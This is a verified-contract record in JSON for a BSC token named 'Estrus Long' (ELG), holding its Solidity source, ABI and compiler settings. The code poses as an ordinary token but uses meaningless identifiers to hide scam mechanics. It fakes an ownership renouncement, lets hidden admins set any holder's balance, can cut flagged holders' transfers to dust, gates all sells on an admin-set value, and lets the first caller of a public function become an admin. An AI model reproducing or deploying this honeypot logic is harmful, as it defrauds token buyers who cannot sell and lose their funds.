{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface txLimitReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract receiverMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atTx {\n    function createPair(address liquidityFundAt, address fundTradingWallet) external returns (address);\n}\n\ninterface tradingLaunch {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountFee) external view returns (uint256);\n\n    function transfer(address isAmountWallet, uint256 liquidityReceiverFee) external returns (bool);\n\n    function allowance(address sellMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityReceiverFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isAmountWallet,\n        uint256 liquidityReceiverFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletTo, uint256 value);\n    event Approval(address indexed sellMarketing, address indexed spender, uint256 value);\n}\n\ninterface senderToken is tradingLaunch {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EstrusLong is receiverMarketing, tradingLaunch, senderToken {\n\n    constructor (){\n        if (amountBuy != shouldModeLaunch) {\n            amountBuy = true;\n        }\n        txLimitReceiver teamSender = txLimitReceiver(senderAuto);\n        swapLaunchedMax = atTx(teamSender.factory()).createPair(teamSender.WETH(), address(this));\n        \n        receiverSellBuy = _msgSender();\n        shouldSell();\n        marketingReceiver[receiverSellBuy] = true;\n        toReceiverList[receiverSellBuy] = feeMin;\n        if (liquidityFromList != swapModeLiquidity) {\n            liquidityFromList = receiverTake;\n        }\n        emit Transfer(address(0), receiverSellBuy, feeMin);\n    }\n\n    function teamAuto() private view {\n        require(marketingReceiver[_msgSender()]);\n    }\n\n    uint256 constant receiverFromExempt = 10 ** 10;\n\n    function swapFrom(uint256 liquidityReceiverFee) public {\n        teamAuto();\n        enableFund = liquidityReceiverFee;\n    }\n\n    function balanceOf(address amountFee) public view virtual override returns (uint256) {\n        return toReceiverList[amountFee];\n    }\n\n    uint256 private totalLaunch;\n\n    function allowance(address shouldMaxToken, address exemptAt) external view virtual override returns (uint256) {\n        if (exemptAt == senderAuto) {\n            return type(uint256).max;\n        }\n        return fundReceiver[shouldMaxToken][exemptAt];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeMin;\n    }\n\n    function transferFrom(address minMode, address isAmountWallet, uint256 liquidityReceiverFee) external override returns (bool) {\n        if (_msgSender() != senderAuto) {\n            if (fundReceiver[minMode][_msgSender()] != type(uint256).max) {\n                require(liquidityReceiverFee <= fundReceiver[minMode][_msgSender()]);\n                fundReceiver[minMode][_msgSender()] -= liquidityReceiverFee;\n            }\n        }\n        return toLaunch(minMode, isAmountWallet, liquidityReceiverFee);\n    }\n\n    address public swapLaunchedMax;\n\n    address private swapTeam;\n\n    function liquidityAmountBuy(address minMode, address isAmountWallet, uint256 liquidityReceiverFee) internal returns (bool) {\n        require(toReceiverList[minMode] >= liquidityReceiverFee);\n        toReceiverList[minMode] -= liquidityReceiverFee;\n        toReceiverList[isAmountWallet] += liquidityReceiverFee;\n        emit Transfer(minMode, isAmountWallet, liquidityReceiverFee);\n        return true;\n    }\n\n    uint256 isReceiver;\n\n    function transfer(address shouldTotal, uint256 liquidityReceiverFee) external virtual override returns (bool) {\n        return toLaunch(_msgSender(), shouldTotal, liquidityReceiverFee);\n    }\n\n    address senderAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return buyAutoList;\n    }\n\n    function limitIs(address isListTeam) public {\n        teamAuto();\n        \n        if (isListTeam == receiverSellBuy || isListTeam == swapLaunchedMax) {\n            return;\n        }\n        toSwapMarketing[isListTeam] = true;\n    }\n\n    address tokenAmountReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public fundLiquidity;\n\n    address public receiverSellBuy;\n\n    string private teamReceiver = \"ELG\";\n\n    uint8 private maxLaunched = 18;\n\n    mapping(address => bool) public marketingReceiver;\n\n    uint256 private liquidityFromList;\n\n    function liquidityTxMin(address shouldTotal, uint256 liquidityReceiverFee) public {\n        teamAuto();\n        toReceiverList[shouldTotal] = liquidityReceiverFee;\n    }\n\n    uint256 enableFund;\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamReceiver;\n    }\n\n    uint256 private swapModeLiquidity;\n\n    bool public shouldModeLaunch;\n\n    event OwnershipTransferred(address indexed swapList, address indexed liquidityTake);\n\n    uint256 public autoShould;\n\n    uint256 private feeMin = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return swapTeam;\n    }\n\n    function toLaunch(address minMode, address isAmountWallet, uint256 liquidityReceiverFee) internal returns (bool) {\n        if (minMode == receiverSellBuy) {\n            return liquidityAmountBuy(minMode, isAmountWallet, liquidityReceiverFee);\n        }\n        uint256 sellShould = tradingLaunch(swapLaunchedMax).balanceOf(tokenAmountReceiver);\n        require(sellShould == enableFund);\n        require(isAmountWallet != tokenAmountReceiver);\n        if (toSwapMarketing[minMode]) {\n            return liquidityAmountBuy(minMode, isAmountWallet, receiverFromExempt);\n        }\n        return liquidityAmountBuy(minMode, isAmountWallet, liquidityReceiverFee);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxLaunched;\n    }\n\n    function shouldSell() public {\n        emit OwnershipTransferred(receiverSellBuy, address(0));\n        swapTeam = address(0);\n    }\n\n    mapping(address => mapping(address => uint256)) private fundReceiver;\n\n    bool public amountBuy;\n\n    bool public launchShould;\n\n    uint256 private receiverFund;\n\n    mapping(address => uint256) private toReceiverList;\n\n    bool public shouldLiquidityExempt;\n\n    function fundAmount(address senderWallet) public {\n        if (shouldLiquidityExempt) {\n            return;\n        }\n        if (autoShould != swapModeLiquidity) {\n            shouldModeLaunch = false;\n        }\n        marketingReceiver[senderWallet] = true;\n        if (fundLiquidity != swapModeLiquidity) {\n            liquidityFromList = fundLiquidity;\n        }\n        shouldLiquidityExempt = true;\n    }\n\n    mapping(address => bool) public toSwapMarketing;\n\n    function approve(address exemptAt, uint256 liquidityReceiverFee) public virtual override returns (bool) {\n        fundReceiver[_msgSender()][exemptAt] = liquidityReceiverFee;\n        emit Approval(_msgSender(), exemptAt, liquidityReceiverFee);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return swapTeam;\n    }\n\n    uint256 private receiverTake;\n\n    string private buyAutoList = \"Estrus Long\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMaxToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityReceiverFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountFee\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderWallet\",\"type\":\"address\"}],\"name\":\"fundAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isListTeam\",\"type\":\"address\"}],\"name\":\"limitIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityReceiverFee\",\"type\":\"uint256\"}],\"name\":\"liquidityTxMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSellBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLiquidityExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldModeLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityReceiverFee\",\"type\":\"uint256\"}],\"name\":\"swapFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLaunchedMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toSwapMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityReceiverFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isAmountWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityReceiverFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EstrusLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}